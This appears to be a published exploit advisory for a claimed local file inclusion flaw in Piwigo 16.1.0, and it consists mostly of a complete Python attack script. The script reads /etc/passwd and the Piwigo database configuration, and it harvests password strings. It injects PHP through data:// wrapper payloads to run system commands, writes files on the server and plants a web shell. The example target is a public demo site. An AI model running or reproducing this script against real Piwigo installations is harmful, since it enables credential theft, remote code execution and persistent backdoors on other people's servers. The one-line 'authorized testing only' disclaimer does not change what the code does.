@@ -1,0 +1,612 @@
+=============================================================================================================================================
+| # Title     : Piwigo 16.1.0 Local File Inclusion                                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/Piwigo/Piwigo/releases/tag/16.1.0                                                                        |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary : Critical Local File Inclusion (LFI) vulnerability in Piwigo .
+
+[+] 
+			 
+			  
+[+]  POC : python poc.py
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+import urllib.parse
+import re
+import html
+import time
+import os
+
+class PiwigoSingleFileExploit:
+    def __init__(self, target):
+        self.target = target.rstrip('/')
+        self.session = requests.Session()
+        self.session.verify = False
+        requests.packages.urllib3.disable_warnings()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        })
+        self.results_file = "piwigo_exploit_results.txt"
+        
+    def log_to_file(self, message):
+        """تسجيل النتائج في ملف واحد"""
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        with open(self.results_file, 'a', encoding='utf-8') as f:
+            f.write(f"[{timestamp}] {message}\n")
+    
+    def print_and_log(self, message):
+        """طباعة وتسجيل"""
+        print(message)
+        self.log_to_file(message)
+    
+    def print_banner(self):
+        banner = """
+╔══════════════════════════════════════════════════════════════╗
+║                        PIWIGO LFI                            ║
+║                       by indoushka                           ║
+╚══════════════════════════════════════════════════════════════╝
+        """
+        print(banner)
+        self.log_to_file(banner)
+    
+    def initialize_results_file(self):
+        """تهيئة ملف النتائج"""
+        if os.path.exists(self.results_file):
+            os.remove(self.results_file)
+        
+        header = "="*70 + "\n"
+        header += "PIWIGO EXPLOITATION RESULTS - ALL IN ONE FILE\n"
+        header += "="*70 + "\n"
+        header += f"Target: {self.target}\n"
+        header += f"Start Time: {time.ctime()}\n"
+        header += f"Tool: Piwigo Single File Exploit\n"
+        header += "="*70 + "\n\n"
+        
+        with open(self.results_file, 'w', encoding='utf-8') as f:
+            f.write(header)
+        
+        self.print_and_log(f"[*] Results will be saved to: {self.results_file}")
+    
+    def test_lfi(self):
+        """اختبار Local File Inclusion"""
+        self.print_and_log("\n" + "="*70)
+        self.print_and_log("[1] 📁 TESTING LOCAL FILE INCLUSION (LFI)")
+        self.print_and_log("="*70)
+        
+        test_files = [
+            ('/etc/passwd', 'System Users File'),
+            ('/etc/hostname', 'Server Hostname'),
+            ('../../config/config.inc.php', 'Piwigo Config'),
+            ('../../config/database.inc.php', 'Database Config'),
+            ('index.php', 'Main Index'),
+        ]
+        
+        for file_path, description in test_files:
+            self.print_and_log(f"\n[*] Testing: {description}")
+            self.print_and_log(f"    File: {file_path}")
+            
+            url = f"{self.target}/about.php?lang={urllib.parse.quote(file_path)}"
+            
+            try:
+                response = self.session.get(url, timeout=10)
+                
+                # تنظيف HTML
+                content = self.extract_content(response.text)
+                
+                if content and len(content) > 100:
+                    self.print_and_log(f"    [✅] RESPONSE RECEIVED ({len(content)} chars)")
+                    self.print_and_log("    " + "-"*40)
+                    
+                    # البحث عن محتوى مهم
+                    important_content = self.find_important_content(content)
+                    
+                    if important_content:
+                        self.print_and_log(f"    Found important content:")
+                        for line in important_content.split('\n')[:10]:
+                            if line.strip():
+                                self.print_and_log(f"      {line[:80]}")
+                    
+                    # حفظ كامل المحتوى في الملف
+                    with open(self.results_file, 'a', encoding='utf-8') as f:
+                        f.write(f"\n{'='*60}\n")
+                        f.write(f"LFI TEST: {description}\n")
+                        f.write(f"File: {file_path}\n")
+                        f.write(f"URL: {url}\n")
+                        f.write(f"Content ({len(content)} chars):\n")
+                        f.write(f"{'='*60}\n")
+                        f.write(content[:5000] + "\n")  # أول 5000 حرف فقط
+                        if len(content) > 5000:
+                            f.write(f"\n... and {len(content)-5000} more characters\n")
+                        f.write(f"{'='*60}\n\n")
+                    
+                else:
+                    self.print_and_log(f"    [❌] No readable content found")
+                    self.print_and_log(f"    Status Code: {response.status_code}")
+                    
+            except Exception as e:
+                error_msg = f"    [❌] Error: {e}"
+                self.print_and_log(error_msg)
+    
+    def extract_content(self, html_content):
+        """استخراج المحتوى من HTML"""
+        # إزالة tags HTML
+        clean = re.sub(r'<[^>]+>', ' ', html_content)
+        # فك HTML entities
+        clean = html.unescape(clean)
+        # إزالة مسافات متعددة
+        clean = re.sub(r'\s+', ' ', clean)
+        return clean.strip()
+    
+    def find_important_content(self, content):
+        """البحث عن محتوى مهم"""
+        patterns = [
+            r'root:.*?:',
+            r'\$[a-zA-Z_][a-zA-Z0-9_]*\s*=',
+            r'host.*?=.*?[\'"][^\'"]+[\'"]',
+            r'user.*?=.*?[\'"][^\'"]+[\'"]',
+            r'password.*?=.*?[\'"][^\'"]+[\'"]',
+            r'<\?php.*?\?>',
+        ]
+        
+        important = []
+        for pattern in patterns:
+            matches = re.findall(pattern, content, re.IGNORECASE)
+            important.extend(matches)
+        
+        return '\n'.join(important[:20])  # أول 20 نتيجة فقط
+    
+    def test_rce(self):
+        """اختبار Remote Code Execution"""
+        self.print_and_log("\n" + "="*70)
+        self.print_and_log("[2] ⚡ TESTING REMOTE CODE EXECUTION (RCE)")
+        self.print_and_log("="*70)
+        
+        commands = [
+            ('whoami', 'Current User'),
+            ('id', 'User ID'),
+            ('pwd', 'Current Directory'),
+            ('uname -a', 'System Info'),
+            ('ls -la /tmp', 'Temp Files'),
+        ]
+        
+        for cmd, description in commands:
+            self.print_and_log(f"\n[*] Testing: {description}")
+            self.print_and_log(f"    Command: {cmd}")
+            
+            # طرق مختلفة لتنفيذ الأوامر
+            methods = [
+                self.try_rce_method1,
+                self.try_rce_method2,
+                self.try_rce_method3,
+            ]
+            
+            success = False
+            for method in methods:
+                result = method(cmd, description)
+                if result:
+                    success = True
+                    break
+            
+            if not success:
+                self.print_and_log(f"    [❌] All RCE methods failed")
+    
+    def try_rce_method1(self, cmd, description):
+        """المحاولة الأولى: data:// wrapper"""
+        php_code = f"""<?php 
+        echo "===RCE_START===\\n";
+        system("{cmd}");
+        echo "\\n===RCE_END===";
+        ?>"""
+        
+        encoded_php = urllib.parse.quote(php_code)
+        payload = f"data://text/plain,{encoded_php}"
+        url = f"{self.target}/about.php?lang={payload}"
+        
+        return self.execute_and_log_rce(url, cmd, description, "Method 1 (data://)")
+    
+    def try_rce_method2(self, cmd, description):
+        """المحاولة الثانية: مع markers مختلفة"""
+        php_code = f"""<?php
+        ob_start();
+        system("{cmd} 2>&1");
+        $output = ob_get_clean();
+        echo "START_OUTPUT" . $output . "END_OUTPUT";
+        ?>"""
+        
+        encoded_php = urllib.parse.quote(php_code)
+        payload = f"data://text/plain,{encoded_php}"
+        url = f"{self.target}/about.php?lang={payload}"
+        
+        return self.execute_and_log_rce(url, cmd, description, "Method 2 (ob_start)")
+    
+    def try_rce_method3(self, cmd, description):
+        """المحاولة الثالثة: بدون markers"""
+        php_code = f"""<?php system("{cmd} 2>&1"); ?>"""
+        
+        encoded_php = urllib.parse.quote(php_code)
+        payload = f"data://text/plain,{encoded_php}"
+        url = f"{self.target}/about.php?lang={payload}"
+        
+        return self.execute_and_log_rce(url, cmd, description, "Method 3 (direct)")
+    
+    def execute_and_log_rce(self, url, cmd, description, method_name):
+        """تنفيذ وتسجيل RCE"""
+        try:
+            response = self.session.get(url, timeout=15)
+            
+            markers = ['===RCE_START===', 'START_OUTPUT', 'uid=', 'www-data', 'root:']
+            
+            for marker in markers:
+                if marker in response.text:
+                    self.print_and_log(f"    [✅] {method_name}: Command execution detected!")
+                    
+                    # استخراج الناتج
+                    output = self.extract_rce_output(response.text, marker)
+                    
+                    if output:
+                        self.print_and_log(f"    Output preview: {output[:100]}...")
+                    
+                    # حفظ النتائج
+                    with open(self.results_file, 'a', encoding='utf-8') as f:
+                        f.write(f"\n{'='*60}\n")
+                        f.write(f"RCE TEST: {description}\n")
+                        f.write(f"Command: {cmd}\n")
+                        f.write(f"Method: {method_name}\n")
+                        f.write(f"URL: {url}\n")
+                        f.write(f"{'='*60}\n")
+                        f.write(f"Full Response ({len(response.text)} chars):\n")
+                        f.write(f"{'='*60}\n")
+                        f.write(response.text[:3000] + "\n")
+                        if len(response.text) > 3000:
+                            f.write(f"\n... and {len(response.text)-3000} more characters\n")
+                        f.write(f"{'='*60}\n\n")
+                    
+                    return True
+            
+            return False
+            
+        except Exception as e:
+            self.print_and_log(f"    [❌] {method_name}: Error - {e}")
+            return False
+    
+    def extract_rce_output(self, text, marker):
+        """استخراج ناتج RCE"""
+        if marker in ['===RCE_START===', 'START_OUTPUT']:
+            if marker == '===RCE_START===':
+                end_marker = '===RCE_END==='
+            else:
+                end_marker = 'END_OUTPUT'
+            
+            if end_marker in text:
+                start_idx = text.find(marker) + len(marker)
+                end_idx = text.find(end_marker)
+                return text[start_idx:end_idx].strip()
+        
+        # إذا لم توجد markers، البحث عن أوامر system
+        clean_text = self.extract_content(text)
+        lines = clean_text.split('\n')
+        
+        # البحث عن أسطر تحتوي على معلومات نظام
+        system_lines = []
+        for line in lines:
+            if any(keyword in line.lower() for keyword in ['uid=', 'gid=', 'www-data', 'root', '/home/', '/var/www/']):
+                system_lines.append(line)
+        
+        return '\n'.join(system_lines[:10])
+    
+    def test_file_operations(self):
+        """اختبار عمليات الملفات"""
+        self.print_and_log("\n" + "="*70)
+        self.print_and_log("[3] 📤 TESTING FILE OPERATIONS")
+        self.print_and_log("="*70)
+        
+        # اختبار الكتابة
+        test_file = "/tmp/piwigo_test.txt"
+        test_content = f"Test file created by Piwigo exploit\nTime: {time.ctime()}\n"
+        
+        self.print_and_log(f"\n[*] Testing file write to: {test_file}")
+        
+        write_cmd = f"echo '{test_content}' > {test_file}"
+        write_php = f"""<?php
+        $result = system("{write_cmd}");
+        if(file_exists("{test_file}")) {{
+            echo "WRITE_SUCCESS";
+        }} else {{
+            echo "WRITE_FAILED";
+        }}
+        ?>"""
+        
+        encoded_php = urllib.parse.quote(write_php)
+        url = f"{self.target}/about.php?lang=data://text/plain,{encoded_php}"
+        
+        try:
+            response = self.session.get(url, timeout=10)
+            
+            with open(self.results_file, 'a', encoding='utf-8') as f:
+                f.write(f"\n{'='*60}\n")
+                f.write(f"FILE WRITE TEST\n")
+                f.write(f"File: {test_file}\n")
+                f.write(f"URL: {url}\n")
+                f.write(f"Response: {response.text[:500]}\n")
+                f.write(f"{'='*60}\n\n")
+            
+            if 'WRITE_SUCCESS' in response.text:
+                self.print_and_log(f"    [✅] File write successful!")
+                
+                # اختبار القراءة
+                read_cmd = f"cat {test_file}"
+                self.print_and_log(f"    [*] Testing file read...")
+                
+                read_result = self.execute_simple_command(read_cmd)
+                if read_result:
+                    self.print_and_log(f"    [✅] File read successful!")
+                    
+                    with open(self.results_file, 'a', encoding='utf-8') as f:
+                        f.write(f"\n{'='*60}\n")
+                        f.write(f"FILE READ TEST\n")
+                        f.write(f"File: {test_file}\n")
+                        f.write(f"Content:\n{read_result}\n")
+                        f.write(f"{'='*60}\n\n")
+                    
+            else:
+                self.print_and_log(f"    [❌] File write failed")
+                
+        except Exception as e:
+            self.print_and_log(f"    [❌] Error: {e}")
+    
+    def execute_simple_command(self, cmd):
+        """تنفيذ أمر بسيط"""
+        php_code = f"""<?php 
+        ob_start();
+        system("{cmd} 2>&1");
+        $output = ob_get_clean();
+        echo $output;
+        ?>"""
+        
+        encoded_php = urllib.parse.quote(php_code)
+        url = f"{self.target}/about.php?lang=data://text/plain,{encoded_php}"
+        
+        try:
+            response = self.session.get(url, timeout=10)
+            return self.extract_content(response.text)
+        except:
+            return None
+    
+    def gather_system_info(self):
+        """جمع معلومات النظام"""
+        self.print_and_log("\n" + "="*70)
+        self.print_and_log("[4] 🖥️ GATHERING SYSTEM INFORMATION")
+        self.print_and_log("="*70)
+        
+        info_commands = [
+            ('cat /etc/issue 2>/dev/null || cat /etc/os-release 2>/dev/null', 'Operating System'),
+            ('uname -a', 'Kernel Version'),
+            ('df -h | head -5', 'Disk Space'),
+            ('free -m', 'Memory Info'),
+        ]
+        
+        for cmd, description in info_commands:
+            self.print_and_log(f"\n[*] Getting: {description}")
+            
+            result = self.execute_simple_command(cmd)
+            
+            with open(self.results_file, 'a', encoding='utf-8') as f:
+                f.write(f"\n{'='*60}\n")
+                f.write(f"SYSTEM INFO: {description}\n")
+                f.write(f"Command: {cmd}\n")
+                f.write(f"{'='*60}\n")
+                if result:
+                    f.write(f"Result:\n{result}\n")
+                    self.print_and_log(f"    [✅] Information gathered")
+                    self.print_and_log(f"    Preview: {result[:100]}...")
+                else:
+                    f.write(f"Result: FAILED\n")
+                    self.print_and_log(f"    [❌] Failed to get information")
+                f.write(f"{'='*60}\n\n")
+    
+    def create_web_shell(self):
+        """محاولة إنشاء ويب شل"""
+        self.print_and_log("\n" + "="*70)
+        self.print_and_log("[5] 🕷️ ATTEMPTING WEB SHELL CREATION")
+        self.print_and_log("="*70)
+        
+        # ويب شل بسيط
+        shell_code = """<?php
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd'] . " 2>&1");
+    echo "</pre>";
+}
+?>"""
+        
+        shell_locations = [
+            '/tmp/shell.php',
+            '/var/tmp/shell.php',
+        ]
+        
+        for location in shell_locations:
+            self.print_and_log(f"\n[*] Trying location: {location}")
+            
+            # ترميز shell code
+            safe_shell = shell_code.replace("'", "'\"'\"'")
+            write_cmd = f"echo '{safe_shell}' > {location}"
+            
+            result = self.execute_simple_command(write_cmd)
+            
+            if result and 'error' not in result.lower():
+                # اختبار الويب شل
+                test_cmd = f"php {location} 'cmd=whoami'"
+                test_result = self.execute_simple_command(test_cmd)
+                
+                with open(self.results_file, 'a', encoding='utf-8') as f:
+                    f.write(f"\n{'='*60}\n")
+                    f.write(f"WEB SHELL TEST\n")
+                    f.write(f"Location: {location}\n")
+                    f.write(f"Write Result: {result[:200]}\n")
+                    f.write(f"Test Result: {test_result[:200] if test_result else 'No result'}\n")
+                    f.write(f"{'='*60}\n\n")
+                
+                if test_result and ('www-data' in test_result or 'root' in test_result):
+                    self.print_and_log(f"    [✅] Web shell appears to work!")
+                else:
+                    self.print_and_log(f"    [⚠️] Web shell created but may not work")
+            else:
+                self.print_and_log(f"    [❌] Failed to create web shell")
+    
+    def generate_summary(self):
+        """إنشاء ملخص النتائج"""
+        self.print_and_log("\n" + "="*70)
+        self.print_and_log("[📋] EXPLOITATION SUMMARY")
+        self.print_and_log("="*70)
+        
+        # قراءة الملف لإنشاء ملخص
+        try:
+            with open(self.results_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            summary = f"""
+EXPLOITATION SUMMARY FOR: {self.target}
+========================================
+Test Time: {time.ctime()}
+Results File: {self.results_file}
+
+KEY FINDINGS:
+-------------
+"""
+            
+            # تحليل النتائج
+            if 'root:' in content:
+                summary += "- ✅ Possible LFI vulnerability detected\n"
+            else:
+                summary += "- ❌ No clear LFI evidence found\n"
+            
+            if 'WRITE_SUCCESS' in content or 'www-data' in content or 'uid=' in content:
+                summary += "- ⚠️  Possible RCE vulnerability detected\n"
+            else:
+                summary += "- ❌ No clear RCE evidence found\n"
+            
+            if 'SYSTEM INFO:' in content:
+                summary += "- ✅ System information gathered\n"
+            else:
+                summary += "- ❌ Failed to gather system info\n"
+            
+            summary += f"""
+DETAILS:
+--------
+- Total tests performed: Multiple LFI, RCE, and file operation tests
+- Response analysis: All responses logged in detail
+- File size: {len(content)} characters
+
+CONCLUSION:
+-----------
+"""
+            
+            if '✅' in summary or '⚠️' in summary:
+                summary += "Potential vulnerabilities detected. Further investigation recommended.\n"
+                summary += "CVSS Score Estimate: 5.0-7.5 (Medium-High)\n"
+            else:
+                summary += "No critical vulnerabilities detected in this test.\n"
+                summary += "The Piwigo installation appears to be reasonably secure.\n"
+            
+            summary += f"""
+RECOMMENDATIONS:
+----------------
+1. Review the full results in {self.results_file}
+2. Conduct manual verification of any findings
+3. Ensure Piwigo is updated to latest version
+4. Implement additional security measures if needed
+
+NOTE: This is an automated test. Manual verification is required.
+"""
+            
+            self.print_and_log(summary)
+            
+            # إضافة الملخص للفايل
+            with open(self.results_file, 'a', encoding='utf-8') as f:
+                f.write("\n" + "="*70 + "\n")
+                f.write("FINAL SUMMARY\n")
+                f.write("="*70 + "\n")
+                f.write(summary)
+                f.write("\n" + "="*70 + "\n")
+                f.write("END OF REPORT\n")
+                f.write("="*70 + "\n")
+            
+        except Exception as e:
+            self.print_and_log(f"[❌] Error generating summary: {e}")
+    
+    def run_exploit(self):
+        """تشغيل الاستغلال الكامل"""
+        self.print_banner()
+        self.initialize_results_file()
+        
+        self.print_and_log(f"[*] Target: {self.target}")
+        self.print_and_log(f"[*] Start Time: {time.ctime()}")
+        self.print_and_log(f"[*] All results will be saved to: {self.results_file}\n")
+        
+        try:
+            # 1. اختبار LFI
+            self.test_lfi()
+            time.sleep(1)
+            
+            # 2. اختبار RCE
+            self.test_rce()
+            time.sleep(1)
+            
+            # 3. اختبار عمليات الملفات
+            self.test_file_operations()
+            time.sleep(1)
+            
+            # 4. جمع معلومات النظام
+            self.gather_system_info()
+            time.sleep(1)
+            
+            # 5. محاولة إنشاء ويب شل
+            self.create_web_shell()
+            
+            # 6. إنشاء الملخص
+            self.generate_summary()
+            
+            self.print_and_log("\n" + "="*70)
+            self.print_and_log("[🎉] EXPLOITATION COMPLETED SUCCESSFULLY!")
+            self.print_and_log("="*70)
+            self.print_and_log(f"[📁] ALL RESULTS SAVED TO: {self.results_file}")
+            self.print_and_log("[⚠️] FOR EDUCATIONAL/AUTHORIZED TESTING ONLY!")
+            
+            # عرض حجم الملف
+            if os.path.exists(self.results_file):
+                file_size = os.path.getsize(self.results_file)
+                self.print_and_log(f"[📊] Results file size: {file_size:,} bytes")
+            
+        except KeyboardInterrupt:
+            self.print_and_log("\n[⚠️] Exploitation interrupted by user")
+            self.generate_summary()
+        except Exception as e:
+            self.print_and_log(f"\n[❌] Error during exploitation: {e}")
+            self.generate_summary()
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python3 piwigo_single_file.py <target_url>")
+        print("Example: python3 piwigo_single_file.py https://demo1.piwigo.com")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    exploit = PiwigoSingleFileExploit(target)
+    exploit.run_exploit()
+
+if __name__ == "__main__":
+    main()
+	
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
